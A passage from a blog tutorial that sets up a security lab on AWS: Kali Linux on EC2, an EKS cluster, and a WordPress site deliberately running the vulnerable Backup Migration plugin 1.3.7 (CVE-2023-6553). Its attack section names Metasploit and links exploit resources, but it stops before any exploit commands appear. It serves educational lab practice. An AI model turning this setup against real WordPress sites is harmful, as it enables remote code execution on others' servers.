<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Exploit vulnerability in a WordPress plugin with Kali Linux" /><meta name="author" content="Petr Ruzicka" /><meta property="og:locale" content="en" /><meta name="description" content="Learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux" /><meta property="og:description" content="Learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux" /><link rel="canonical" href="https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/" /><meta property="og:url" content="https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/" /><meta property="og:site_name" content="Petr’s Blog" /><meta property="og:image" content="https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-04-27T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png" /><meta property="twitter:title" content="Exploit vulnerability in a WordPress plugin with Kali Linux" /><meta name="twitter:site" content="@Ruzicka_Petr" /><meta name="twitter:creator" content="@Ruzicka_Petr" /><meta name="google-site-verification" content="4ugGShJoiB9veoPwFcMsMjzk-1BYbi5ozcSnovkBWtA" /><meta name="msvalidate.01" content="592AB158E3F9EF887F8DC8E69A2FF754" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Petr Ruzicka","url":"https://petr.ruzicka.dev"},"dateModified":"2025-06-03T21:56:36+02:00","datePublished":"2024-04-27T00:00:00+02:00","description":"Learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux","headline":"Exploit vulnerability in a WordPress plugin with Kali Linux","image":"https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/"},"url":"https://ruzickap.github.io/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/"}</script><title>Exploit vulnerability in a WordPress plugin with Kali Linux | Petr's Blog</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> document.addEventListener('DOMContentLoaded', () => { const pv = document.getElementById('pageviews'); if (pv !== null) { const uri = location.pathname.replace(/\/$/, ''); const url = `https://ruzickap-github-io.goatcounter.com/counter/${encodeURIComponent(uri)}.json`; fetch(url) .then((response) => response.json()) .then((data) => { const count = data.count.replace(/\D/g, ''); pv.innerText = new Intl.NumberFormat().format(count); }) .catch((error) => { pv.innerText = '1'; }); } }); </script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-64WRCWDZM8"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-64WRCWDZM8'); }); </script> <script async src="https://gc.zgo.at/count.js" data-goatcounter="https://ruzickap-github-io.goatcounter.com/count" ></script> <script defer src="https://cloud.umami.is/script.js" data-website-id="380ea41a-7d5f-4423-8e13-03151bde195f" ></script> <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "3ppVAbe7E50OYFNqyhCNM1wmS_uQ1FrH5PHYn9d-"}' ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="https://0.gravatar.com/avatar/5484c0fd9f98e2ffd9212b158931bf4b?s=200" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Petr's Blog</a><p class="site-subtitle fst-italic mb-0">DevOps • GitOps • K8s</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-project-diagram"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/ruzickap" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['petr.ruzicka','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/petrruzicka/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="https://petr.ruzicka.dev" aria-label="homepage" target="_blank" rel="noopener noreferrer" > <i class="fas fa-home"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Exploit vulnerability in a WordPress plugin with Kali Linux</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Exploit vulnerability in a WordPress plugin with Kali Linux</h1><p class="post-desc fw-light mb-4">Learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1714168800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 27, 2024 </time> </span> <span> Updated <time data-ts="1748980596" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jun 3, 2025 </time> </span><div class="mt-3 mb-3"> <a href="https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png" class="popup img-link preview-img shimmer"><img src="https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png" alt="Preview Image" width="1200" height="630" loading="lazy"></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://petr.ruzicka.dev">Petr Ruzicka</a> </em> </span><div> <span> <em id="pageviews"> <i class="fas fa-spinner fa-spin small"></i> </em> views </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1996 words" > <em>11 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Exploit vulnerability in a WordPress plugin with Kali Linux</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Exploit vulnerability in a WordPress plugin with Kali Linux</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>For educational purposes, it can be useful to learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux.</p><p>I will cover the following steps:</p><ul><li>Install an Amazon EKS cluster<li>Install a vulnerable WordPress application to Kubernetes (K8s)<li>Install Kali Linux on an EC2 instance<li>Exploit a vulnerability in a WordPress plugin using Kali Linux and Metasploit</ul><h2 id="set-necessary-environment-variables-and-download-cloudformation-templates"><span class="me-2">Set necessary environment variables and download CloudFormation templates</span><a href="#set-necessary-environment-variables-and-download-cloudformation-templates" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Requirements:</p><ul><li><a href="https://aws.amazon.com/cli/">AWS CLI</a><li><a href="https://eksctl.io/">eksctl</a><li><a href="https://github.com/kubernetes/kubectl">kubectl</a><li><a href="https://github.com/helm/helm">helm</a></ul><p>Set the required AWS environment variables:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">"xxxxxxxxxxxxxxxxxx"</span>
<span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_REGION</span><span class="o">=</span><span class="s2">"eu-central-1"</span>
<span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="o">=</span><span class="s2">"ruzickap-test"</span>
<span class="nv">TMP_DIR</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">:-${</span><span class="nv">PWD</span><span class="k">}}</span><span class="s2">"</span>
</pre></table></code></div></div><p>Download the CloudFormation templates for Kali Linux and the VPC:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>wget <span class="nt">--continue</span> <span class="nt">-q</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/e43fe99f21b02635873bddeed92b669e8e5156d3/ci_tools/vpc_cloudformation_template.yml
wget <span class="nt">--continue</span> <span class="nt">-q</span> <span class="nt">-P</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">"</span> https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/b5e676d847da88e95f7227b8da96c2e4f28f88f3/cfn/KaliLinux-NICE-DCV.yaml
</pre></table></code></div></div><p>Create a new AWS EC2 Key Pair:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>aws ec2 create-key-pair <span class="nt">--key-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--key-type</span> ed25519 <span class="nt">--query</span> <span class="s2">"KeyMaterial"</span> <span class="nt">--output</span> text <span class="o">&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span>
<span class="nb">chmod </span>600 <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span>
</pre></table></code></div></div><h2 id="run-kali-linux-on-amazon-ec2-instance"><span class="me-2">Run Kali Linux on Amazon EC2 instance</span><a href="#run-kali-linux-on-amazon-ec2-instance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png" class="popup img-link shimmer"><img src="https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png" alt="Kali Linux" width="700" loading="lazy"></a></p><p>Create an AWS EC2 instance with <a href="https://www.kali.org/">Kali Linux</a> using the CloudFormation template:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">SOLUTION_KALI</span><span class="o">=</span><span class="s2">"KaliLinux-NICE-DCV"</span>

aws cloudformation deploy <span class="nt">--capabilities</span> CAPABILITY_IAM <span class="se">\</span>
  <span class="nt">--parameter-overrides</span> <span class="s2">"EnvironmentName=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--template-file</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/vpc_cloudformation_template.yml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Environment=dev Solution=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>

<span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="o">=</span><span class="si">$(</span>aws cloudformation describe-stacks <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span> <span class="nt">--query</span> <span class="s2">"Stacks[0].Outputs[? OutputKey==</span><span class="se">\`</span><span class="s2">PublicSubnet1</span><span class="se">\`</span><span class="s2"> || OutputKey==</span><span class="se">\`</span><span class="s2">VPC</span><span class="se">\`</span><span class="s2">].{OutputKey:OutputKey,OutputValue:OutputValue}"</span><span class="si">)</span>
<span class="nv">AWS_VPC_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">VPC</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>
<span class="nv">AWS_SUBNET_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_CLOUDFORMATION_DETAILS</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".[] | select(.OutputKey==</span><span class="se">\"</span><span class="s2">PublicSubnet1</span><span class="se">\"</span><span class="s2">) .OutputValue"</span><span class="si">)</span>

<span class="nb">eval </span>aws cloudformation create-stack <span class="nt">--capabilities</span> CAPABILITY_AUTO_EXPAND CAPABILITY_IAM <span class="se">\</span>
  <span class="nt">--parameters</span> <span class="s2">"ParameterKey=ec2KeyPair,ParameterValue=</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2"> ParameterKey=vpcID,ParameterValue=</span><span class="k">${</span><span class="nv">AWS_VPC_ID</span><span class="k">}</span><span class="s2"> ParameterKey=subnetID,ParameterValue=</span><span class="k">${</span><span class="nv">AWS_SUBNET_ID</span><span class="k">}</span><span class="s2"> ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS"</span> <span class="se">\</span>
  <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--template-body</span> <span class="s2">"file://</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/KaliLinux-NICE-DCV.yaml"</span> <span class="se">\</span>
  <span class="nt">--tags</span> <span class="s2">"Key=Owner,Value=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2"> Key=Environment,Value=dev Key=Solution,Value=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><h2 id="install-amazon-eks-cluster-and-vulnerable-wordpress-application"><span class="me-2">Install Amazon EKS cluster and vulnerable Wordpress Application</span><a href="#install-amazon-eks-cluster-and-vulnerable-wordpress-application" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s look at how to install the Amazon EKS cluster and the vulnerable WordPress application.</p><h3 id="install-the-amazon-eks-cluster"><span class="me-2">Install the Amazon EKS cluster</span><a href="#install-the-amazon-eks-cluster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Install the Amazon EKS cluster using <code class="language-plaintext highlighter-rouge">eksctl</code>:</p><p><a href="https://raw.githubusercontent.com/weaveworks/eksctl/2b1ec6223c4e7cb8103c08162e6de8ced47376f9/userdocs/src/img/eksctl.png" class="popup img-link shimmer"><img src="https://raw.githubusercontent.com/weaveworks/eksctl/2b1ec6223c4e7cb8103c08162e6de8ced47376f9/userdocs/src/img/eksctl.png" alt="eksctl" width="600" loading="lazy"></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">SOLUTION_EKS</span><span class="o">=</span><span class="s2">"Amazon-EKS"</span>
<span class="nb">export </span><span class="nv">KUBECONFIG</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/kubeconfig-</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">.conf"</span>

eksctl create cluster <span class="se">\</span>
  <span class="nt">--name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2">,Solution=</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">,Cluster=</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
  <span class="nt">--node-type</span> t3a.medium <span class="nt">--node-volume-size</span> 20 <span class="nt">--node-private-networking</span> <span class="se">\</span>
  <span class="nt">--kubeconfig</span> <span class="s2">"</span><span class="k">${</span><span class="nv">KUBECONFIG</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><h3 id="install-vulnerable-wordpress-application"><span class="me-2">Install vulnerable Wordpress Application</span><a href="#install-vulnerable-wordpress-application" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Install the vulnerable WordPress application to the Amazon EKS cluster using a Helm chart, and modify its <a href="https://github.com/bitnami/charts/tree/main/bitnami/wordpress">default values</a>:</p><p><a href="https://user-images.githubusercontent.com/6468571/183256208-c68f8f50-d0fd-4dde-85ad-7e2ea828f78e.png" class="popup img-link shimmer"><img src="https://user-images.githubusercontent.com/6468571/183256208-c68f8f50-d0fd-4dde-85ad-7e2ea828f78e.png" alt="Wordpress" width="400" loading="lazy"></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">WORDPRESS_HELM_CHART_VERSION</span><span class="o">=</span><span class="s2">"22.1.3"</span>

<span class="nb">tee</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/helm_values-wordpress.yml"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
wordpressUsername: wordpress
wordpressPassword: </span><span class="si">$(</span>openssl rand <span class="nt">-base64</span> 12<span class="si">)</span><span class="sh">
customPostInitScripts:
  install_plugins.sh: |
    wp plugin install backup-backup --version=1.3.7 --activate
persistence:
  enabled: false
mariadb:
  primary:
    persistence:
      enabled: false
</span><span class="no">EOF
</span>helm upgrade <span class="nt">--install</span> <span class="nt">--version</span> <span class="s2">"</span><span class="k">${</span><span class="nv">WORDPRESS_HELM_CHART_VERSION</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--namespace</span> wordpress <span class="nt">--create-namespace</span> <span class="nt">--wait</span> <span class="nt">--values</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/helm_values-wordpress.yml"</span> wordpress oci://registry-1.docker.io/bitnamicharts/wordpress
</pre></table></code></div></div><p>Version <code class="language-plaintext highlighter-rouge">1.3.7</code> of the vulnerable <a href="https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/">WordPress Backup Migration Plugin</a> was installed.</p><p>Let’s get the LoadBalancer / WordPress URL:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">K8S_WORDPRESS_SERVICE</span><span class="o">=</span><span class="si">$(</span>kubectl get services <span class="nt">--namespace</span> wordpress wordpress <span class="nt">--output</span> <span class="nv">jsonpath</span><span class="o">=</span><span class="s1">'{.status.loadBalancer.ingress[0].hostname}'</span><span class="si">)</span>
</pre></table></code></div></div><p>Summarize the WordPress URL, Admin URL, Username, and Password:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"WordPress URL: http://</span><span class="k">${</span><span class="nv">K8S_WORDPRESS_SERVICE</span><span class="k">}</span><span class="s2">/"</span>
<span class="nb">echo</span> <span class="s2">"WordPress Admin URL: http://</span><span class="k">${</span><span class="nv">K8S_WORDPRESS_SERVICE</span><span class="k">}</span><span class="s2">/admin"</span>
<span class="nb">echo</span> <span class="s2">"Username: wordpress"</span>
<span class="nb">echo</span> <span class="s2">"Password: </span><span class="si">$(</span>kubectl get secret <span class="nt">--namespace</span> wordpress wordpress <span class="nt">-o</span> <span class="nv">jsonpath</span><span class="o">=</span><span class="s1">'{.data.wordpress-password}'</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="si">)</span><span class="s2">"</span>
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">WordPress URL: http://ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com/
WordPress Admin URL: http://ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com/admin
Username: wordpress
Password: a6jnQ16JZS5TLLri
</span></pre></table></code></div></div><h2 id="attack-the-wordpress-application"><span class="me-2">Attack the Wordpress Application</span><a href="#attack-the-wordpress-application" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The following commands run the Metasploit Framework to exploit a vulnerability in the <a href="https://wordpress.org/plugins/backup-backup/">WordPress Backup Migration Plugin</a>.</p><p>Details about the vulnerability can be found here:</p><ul><li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/">WordPress Backup Migration Plugin PHP Filter Chain RCE</a><li><a href="https://www.cvedetails.com/cve/CVE-2023-6553/">Vulnerability Details : CVE-2023-6553</a><li><a href="https://github.com/Chocapikk/CVE-2023-6553">CVE-2023-6553 Exploit V2</a><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6553">CVE-2023-6553 Detail</a></ul><p>Allow your user to connect using SSH:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="o">=</span><span class="si">$(</span>aws ec2 describe-instances <span class="nt">--filters</span> <span class="s2">"Name=tag:Solution,Values=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s2">"Reservations[].Instances[].PublicIpAddress"</span> <span class="nt">--output</span> text<span class="si">)</span>
